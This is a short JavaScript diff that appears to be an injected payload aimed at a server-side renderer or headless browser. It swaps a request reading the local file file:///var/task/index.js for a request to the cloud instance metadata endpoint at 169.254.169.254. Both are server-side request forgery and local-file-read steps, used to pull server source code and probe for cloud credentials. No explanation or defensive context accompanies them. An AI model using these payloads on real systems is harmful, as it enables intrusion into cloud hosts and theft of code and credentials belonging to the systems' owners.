@@ -9,5 +9,5 @@ function reqListener () {
 } 
 var oReq = new XMLHttpRequest(); 
 oReq.addEventListener("load", reqListener); 
-oReq.open("GET", "file:///var/task/index.js"); 
+oReq.open("GET", "http://169.254.169.254/metadata/v1/maintenance"); 
 oReq.send();
